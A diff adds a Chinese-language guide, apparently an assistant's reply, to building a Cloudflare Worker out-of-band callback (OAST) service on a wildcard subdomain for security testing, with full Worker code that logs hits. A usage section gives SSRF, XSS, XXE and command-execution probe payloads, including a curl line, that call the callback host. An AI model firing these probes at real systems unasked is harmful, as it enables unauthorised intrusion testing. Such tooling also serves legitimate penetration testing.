@@ -1,0 +1,569 @@
+下面我按你的域名 **`acclen.com`**，给你一套 **Cloudflare Worker 版 OAST / “类 DNSLog”** 的完整操作说明。
+
+先说关键前提：
+
+**这套方案本质上是“回连平台”而不是严格意义上的纯 DNSLog。**
+它最擅长的是：
+
+* SSRF 验证
+* XSS 外带验证
+* XXE 外连验证
+* 命令执行后的 `curl/wget` 回连确认
+* Webhook / callback 测试
+
+它的工作方式是：
+
+1. 用 **通配符子域** 接住随机域名
+2. 让这些请求进入 **Cloudflare Worker**
+3. Worker 记录 `Host / URL / IP / UA / 时间`
+4. 你通过 token 判断哪次测试命中了
+
+Cloudflare 支持 **wildcard DNS records**，而且可以设为 proxied；但 **Workers Custom Domains 不支持 wildcard DNS records**，所以这里不能走“给 Worker 直接绑 `*.acclen.com` 自定义域”那条路，而应当走 **DNS + Route** 的方式。Cloudflare 的 Workers Route 文档也说明，先要有 DNS record，再配置 route。([Cloudflare Docs][1])
+
+---
+
+# 一、最终架构
+
+建议你用这个子域专门做回连：
+
+**`oast.acclen.com`**
+
+然后做通配符：
+
+**`*.oast.acclen.com`**
+
+以后你生成 payload 时，就用：
+
+* `a1b2c3.oast.acclen.com`
+* `xss-001.oast.acclen.com`
+* `ssrf-test-9.oast.acclen.com`
+
+请求流程是：
+
+`目标系统 -> DNS 解析 *.oast.acclen.com -> Cloudflare -> Worker -> KV 存储 -> 你查询结果`
+
+---
+
+# 二、先理解一个重要限制
+
+这套方案**不是纯 DNS query 日志平台**。
+
+也就是说：
+
+* 如果目标只做了一次 DNS 解析，**但没有继续发 HTTP/HTTPS 请求**，Worker 未必能看到。
+* Worker 看到的是 **HTTP/HTTPS 到达边缘后的请求**。
+
+所以这套方案更准确地说是：
+
+**Cloudflare Worker 版 OAST 平台**
+
+不是权威 DNS 服务器版 dnslog。
+
+---
+
+# 三、你要准备的东西
+
+你已经有：
+
+* 域名：`acclen.com`
+* Cloudflare 账号
+
+你还需要：
+
+* 开通 Workers
+* 开通 KV
+* 本地安装 Node.js 和 Wrangler
+  Cloudflare 官方推荐用 Wrangler 管理 Worker 和 KV。([Cloudflare Docs][2])
+
+---
+
+# 四、DNS 配置
+
+进入 Cloudflare 后台：
+
+**`acclen.com` → DNS → Records**
+
+添加两条记录。
+
+## 1）主通配符记录
+
+如果你想让任意三级子域都进来：
+
+* Type: `A`
+* Name: `*.oast`
+* IPv4 address: `192.0.2.1`
+
+这里 IP 可以先随便填一个占位测试地址，例如文档示例地址段。因为真正处理请求的是 Worker route，不是这台真实服务器。关键是先有 DNS record，Cloudflare 的 route 配置要求先存在对应 DNS 记录。([Cloudflare Docs][3])
+
+* Proxy status: **Proxied**
+
+也就是橙云打开。
+
+## 2）可选：根子域记录
+
+为了你后续访问 `oast.acclen.com` 本身也能有一个落点，可以再加：
+
+* Type: `A`
+* Name: `oast`
+* IPv4 address: `192.0.2.1`
+* Proxy status: **Proxied**
+
+---
+
+# 五、创建 Worker 项目
+
+本地终端执行：
+
+```bash
+npm install -g wrangler
+wrangler login
+npm create cloudflare@latest cf-oast
+```
+
+按提示选择：
+
+* Worker only
+* JavaScript 或 TypeScript 都行
+
+进入目录：
+
+```bash
+cd cf-oast
+```
+
+---
+
+# 六、创建 KV 命名空间
+
+KV 用来存命中记录。
+
+执行：
+
+```bash
+wrangler kv namespace create OAST_KV
+```
+
+Cloudflare KV 文档说明，可以用 Wrangler 创建 namespace。([Cloudflare Docs][4])
+
+执行后会返回类似：
+
+```json
+{
+  "id": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+}
+```
+
+把这个 `id` 记下来。
+
+---
+
+# 七、配置 `wrangler.jsonc`
+
+如果项目生成的是 `wrangler.jsonc`，可以改成这样：
+
+```json
+{
+  "name": "cf-oast",
+  "main": "src/index.js",
+  "compatibility_date": "2026-04-22",
+  "kv_namespaces": [
+    {
+      "binding": "OAST_KV",
+      "id": "你的KV_NAMESPACE_ID"
+    }
+  ],
+  "routes": [
+    {
+      "pattern": "*.oast.acclen.com/*",
+      "zone_name": "acclen.com"
+    },
+    {
+      "pattern": "oast.acclen.com/*",
+      "zone_name": "acclen.com"
+    }
+  ]
+}
+```
+
+这里的重点是：
+
+* `routes` 可以配置多个
+* Route 模式是 Cloudflare Workers 官方支持的部署方式
+* Route 之前必须有 DNS 记录存在([Cloudflare Docs][5])
+
+---
+
+# 八、Worker 代码
+
+下面给你一份可直接用的最小版本。
+
+它做三件事：
+
+1. 接收任意 `*.oast.acclen.com`
+2. 从子域里提取 token
+3. 把命中信息写入 KV
+4. 提供 `/lookup?token=xxx` 查询结果
+5. 提供 `/gen` 生成测试 token
+
+把 `src/index.js` 改成：
+
+```javascript
+export default {
+  async fetch(request, env, ctx) {
+    const url = new URL(request.url);
+    const host = (request.headers.get("host") || "").toLowerCase();
+    const pathname = url.pathname;
+
+    // 简单管理接口：
+    // https://oast.acclen.com/gen
+    // https://oast.acclen.com/lookup?token=abc123
+    if (host === "oast.acclen.com") {
+      if (pathname === "/gen") {
+        const token = crypto.randomUUID().replace(/-/g, "").slice(0, 12);
+        const fqdn = `${token}.oast.acclen.com`;
+
+        await env.OAST_KV.put(
+          `token:${token}`,
+          JSON.stringify({
+            token,
+            fqdn,
+            created_at: new Date().toISOString(),
+            hit_count: 0,
+            events: []
+          }),
+          { expirationTtl: 60 * 60 * 24 * 7 } // 7天
+        );
+
+        return json({
+          ok: true,
+          token,
+          fqdn,
+          example_urls: {
+            http: `http://${fqdn}/`,
+            https: `https://${fqdn}/`
+          }
+        });
+      }
+
+      if (pathname === "/lookup") {
+        const token = url.searchParams.get("token");
+        if (!token) {
+          return json({ ok: false, error: "missing token" }, 400);
+        }
+
+        const data = await env.OAST_KV.get(`token:${token}`);
+        if (!data) {
+          return json({ ok: false, error: "token not found" }, 404);
+        }
+
+        return new Response(data, {
+          status: 200,
+          headers: { "content-type": "application/json; charset=utf-8" }
+        });
+      }
+
+      return json({
+        ok: true,
+        message: "cf-oast is running",
+        endpoints: ["/gen", "/lookup?token=<token>"]
+      });
+    }
+
+    // 处理任意 token.oast.acclen.com
+    if (host.endsWith(".oast.acclen.com")) {
+      const suffix = ".oast.acclen.com";
+      const token = host.slice(0, -suffix.length);
+
+      const event = {
+        time: new Date().toISOString(),
+        host,
+        method: request.method,
+        url: request.url,
+        path: url.pathname,
+        query: Object.fromEntries(url.searchParams.entries()),
+        user_agent: request.headers.get("user-agent") || "",
+        referer: request.headers.get("referer") || "",
+        ip: request.headers.get("cf-connecting-ip") || "",
+        ray: request.headers.get("cf-ray") || "",
+        colo: request.cf?.colo || "",
+        country: request.cf?.country || "",
+        asn: request.cf?.asn || null
+      };
+
+      const key = `token:${token}`;
+      const existing = await env.OAST_KV.get(key);
+      let obj;
+
+      if (existing) {
+        obj = JSON.parse(existing);
+      } else {
+        // 允许直接打随机子域，即使未先 /gen
+        obj = {
+          token,
+          fqdn: host,
+          created_at: new Date().toISOString(),
+          hit_count: 0,
+          events: []
+        };
+      }
+
+      obj.hit_count += 1;
+      obj.last_hit_at = event.time;
+      obj.events.push(event);
+
+      // 防止记录无限变大，只保留最近20条
+      if (obj.events.length > 20) {
+        obj.events = obj.events.slice(-20);
+      }
+
+      await env.OAST_KV.put(key, JSON.stringify(obj), {
+        expirationTtl: 60 * 60 * 24 * 7
+      });
+
+      return new Response("ok", {
+        status: 200,
+        headers: { "content-type": "text/plain; charset=utf-8" }
+      });
+    }
+
+    return new Response("not found", { status: 404 });
+  }
+};
+
+function json(data, status = 200) {
+  return new Response(JSON.stringify(data, null, 2), {
+    status,
+    headers: { "content-type": "application/json; charset=utf-8" }
+  });
+}
+```
+
+---
+
+# 九、部署
+
+执行：
+
+```bash
+wrangler deploy
+```
+
+Wrangler 官方文档说明，核心部署命令就是 `wrangler deploy`。([Cloudflare Docs][6])
+
+部署成功后，Cloudflare 会把这个 Worker 挂到你定义的 routes 上。
+
+---
+
+# 十、验证是否生效
+
+先访问：
+
+```bash
+https://oast.acclen.com/gen
+```
+
+预期返回：
+
+```json
+{
+  "ok": true,
+  "token": "abc123def456",
+  "fqdn": "abc123def456.oast.acclen.com",
+  "example_urls": {
+    "http": "http://abc123def456.oast.acclen.com/",
+    "https": "https://abc123def456.oast.acclen.com/"
+  }
+}
+```
+
+然后浏览器访问：
+
+```bash
+https://abc123def456.oast.acclen.com/test?a=1
+```
+
+再查：
+
+```bash
+https://oast.acclen.com/lookup?token=abc123def456
+```
+
+你应该能看到：
+
+* `hit_count`
+* `last_hit_at`
+* `events`
+* IP / UA / URL / path / query
+
+---
+
+# 十一、实际使用方法
+
+## SSRF
+
+把目标 URL 改成：
+
+```text
+http://abc123def456.oast.acclen.com/
+```
+
+如果目标服务器真的发起了请求，你就能在 `/lookup` 里看到。
+
+## XSS
+
+前端 payload 里放：
+
+```html
+<script src="https://abc123def456.oast.acclen.com/x.js"></script>
+```
+
+或者：
+
+```html
+<img src="https://abc123def456.oast.acclen.com/pixel">
+```
+
+## XXE
+
+外部实体地址写成：
+
+```text
+http://abc123def456.oast.acclen.com/xxe.dtd
+```
+
+## 命令执行
+
+比如：
+
+```bash
+curl http://abc123def456.oast.acclen.com/rce
+```
+
+---
+
+# 十二、为什么这里用 Route，而不是 Custom Domain
+
+因为 Cloudflare 官方文档明确写了：
+
+**Custom Domains do not support wildcard DNS records.**
+也就是你不能直接把 `*.oast.acclen.com` 作为 Worker 的 Custom Domain 来挂。([Cloudflare Docs][7])
+
+但你可以：
+
+* 先在 DNS 里建 `*.oast`
+* 再在 Worker 上配 route：`*.oast.acclen.com/*`
+
+这正是这个方案的核心。
+
+---
+
+# 十三、推荐的增强项
+
+## 1）加一个简单鉴权
+
+现在 `/lookup` 和 `/gen` 是公开的。建议加一个 API Key。
+
+例如要求：
+
+```bash
+https://oast.acclen.com/gen?key=你的密钥
+https://oast.acclen.com/lookup?token=xxx&key=你的密钥
+```
+
+Worker 里验证 `env.API_KEY`。
+
+## 2）只保留最近 N 条事件
+
+我上面的代码保留了最近 20 条，防止 KV value 过大。
+
+## 3）加 `/list`
+
+列出最近生成过的 token。
+
+## 4）加 `/delete`
+
+用完就删，避免长期堆积。
+
+## 5）加标记字段
+
+生成 token 时附带用途：
+
+* `scene=ssrf`
+* `scene=xss`
+* `project=test1`
+
+---
+
+# 十四、常见故障排查
+
+## 1）访问不到 Worker
+
+先检查：
+
+* `*.oast.acclen.com` DNS 记录是否存在
+* 是否是 **Proxied**
+* route 是否写成了 `*.oast.acclen.com/*`
+* zone_name 是否是 `acclen.com`
+
+Workers route 生效前，Cloudflare 要求对应域名先有 DNS record。([Cloudflare Docs][3])
+
+## 2）根域可访问，随机子域不行
+
+通常是：
+
+* 只配了 `oast`，没配 `*.oast`
+* route 只配了 `oast.acclen.com/*`，没配 `*.oast.acclen.com/*`
+
+## 3）只看到很少命中
+
+可能原因：
+
+* 目标只做了 DNS 解析，没有真正发 HTTP
+* 对方环境只允许 80，不允许 443
+* 对方有代理/WAF/egress 限制
+
+## 4）HTTPS 证书问题
+
+Cloudflare 对 proxied 主机名会处理边缘证书，但泛子域首次覆盖和传播可能需要一点时间。若刚配置完成，先稍等再测。相关域名与路由行为以 DNS record 和 route 生效为前提。([Cloudflare Docs][1])
+
+---
+
+# 十五、你现在最应该这样做
+
+按顺序：
+
+1. 在 `acclen.com` 下创建
+
+   * `oast` A 记录，橙云
+   * `*.oast` A 记录，橙云
+
+2. 本地创建 Worker 项目
+
+3. 建 KV namespace
+
+4. 写入上面的 `wrangler.jsonc`
+
+5. 放入上面的 Worker 代码
+
+6. `wrangler deploy`
+
+7. 测试
+
+   * `https://oast.acclen.com/gen`
+   * `https://<token>.oast.acclen.com/test`
+   * `https://oast.acclen.com/lookup?token=<token>`
+
+---
+
+# 十六、给你的实用建议
+
+如果你是为了安全测试使用，这个命名更清晰：
+
+* `oast.acclen.com`：管理接口
+* `*.oast.acclen.com`：随机回连域
+
+不要直接用：
+
+* `*.acclen.com`
+
+因为这样会把整个主域空间搅在一起，后面排障和管理都不方便。
